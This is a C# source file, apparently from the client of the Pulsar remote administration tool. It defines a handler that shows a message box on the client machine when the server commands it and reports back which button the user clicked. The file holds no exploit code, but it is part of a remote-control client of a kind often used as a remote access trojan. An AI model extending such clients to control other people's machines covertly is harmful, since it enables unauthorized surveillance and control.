using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Messages.UserSupport.MessageBox;
using Pulsar.Common.Networking;
using System;
using System.Threading;
using System.Windows.Forms;

namespace Pulsar.Client.Messages
{
    public class MessageBoxHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoShowMessageBox;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            if (message is DoShowMessageBox msg)
                Execute(sender, msg);
        }

        private void Execute(ISender client, DoShowMessageBox message)
        {
            new Thread(() =>
            {
                try
                {
                    var buttons = (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), message.Button);
                    var icon = (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), message.Icon);

                    DialogResult result = MessageBox.Show(
                        message.Text,
                        message.Caption,
                        buttons,
                        icon,
                        MessageBoxDefaultButton.Button1,
                        MessageBoxOptions.DefaultDesktopOnly);

                    // Send which button the user clicked
                    client.Send(new SetStatus
                    {
                        Message = $"MessageBox result: {result}"
                    });
                }
                catch (Exception ex)
                {
                    client.Send(new SetStatus
                    {
                        Message = $"Error showing MessageBox: {ex.Message}"
                    });
                }
            })
            { IsBackground = true }.Start();
        }
    }
}
